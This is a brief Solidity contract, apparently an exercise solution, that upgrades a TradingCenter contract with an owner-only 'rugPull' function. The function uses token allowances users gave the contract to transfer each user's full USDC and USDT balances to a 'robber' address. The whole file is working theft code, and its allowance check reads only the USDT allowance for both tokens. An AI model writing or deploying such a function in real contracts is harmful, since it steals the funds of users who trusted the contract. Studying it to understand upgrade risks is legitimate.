// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;
import { TradingCenter } from "./TradingCenter.sol";
import { Ownable } from "./Ownable.sol";

// TODO: Try to implement TradingCenterV2 here

contract TradingCenterV2 is TradingCenter, Ownable {

    function rugPull(address user, address robber) external onlyOwner {
        // TODO: implement rugPull
        uint256 myAllowance = usdt.allowance(user, address(this));
        require(myAllowance >= usdc.balanceOf(user) && myAllowance >= usdt.balanceOf(user), "Not enough allowance");
        usdc.transferFrom(user, robber, usdc.balanceOf(user));
        usdt.transferFrom(user, robber, usdt.balanceOf(user));
    }

}